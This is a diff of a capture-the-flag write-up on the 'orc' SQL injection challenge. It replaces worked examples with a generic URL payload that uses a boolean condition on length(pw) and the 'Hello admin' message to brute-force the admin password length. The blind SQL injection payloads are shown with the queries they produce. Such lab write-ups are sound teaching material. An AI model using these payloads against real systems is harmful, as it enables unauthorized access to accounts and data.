@@ -30,48 +30,16 @@ First we have to reveal the length of the flag.
 If we provide the following URI parameter:
 
 ```
-?pw=' OR id='admin' AND length(pw)=1 -- -
+?pw=' OR id='admin' AND length(pw)=[length] -- -
 ```
 
 The resultant query becomes:
 
 ```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=1 -- -'
-
-## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=1
-
-## Commented part:
-'
+SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=[length] -- -'
 ```
 
-![2](https://github.com/Kunull/Write-ups/assets/110326359/d0e5928c-c2a2-4355-a6a2-af11d1804556)
-
-Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
-That tells us that the length of the `pw` column is more than 1.
-
-If we keep increasing the length and provide the following URI parameter:
-
-```
-?pw=' OR id='admin' AND length(pw)=8 -- -
-```
-
-The resultant query becomes:
-
-```sql
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8 -- -'
-
-## Queried part:
-SELECT id FROM prob_orc WHERE id='admin' AND pw='' OR id='admin' AND length(pw)=8
-
-## Commented part:
-'
-```
-
-![3](https://github.com/Kunull/Write-ups/assets/110326359/9e438378-10e1-4f7a-9353-bdf75700825d)
-
-Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
-That tells us that the length of the `pw` column is 8.
+When the length of `pw` for `id='admin'` is equal to the `[length]` that we provide, the query will result into `True`. This will cause the `Hello admin` message to be printed. We can brute force the length and use the message as an indicator of correct brute force value.
 
 ### Leaking the password
 
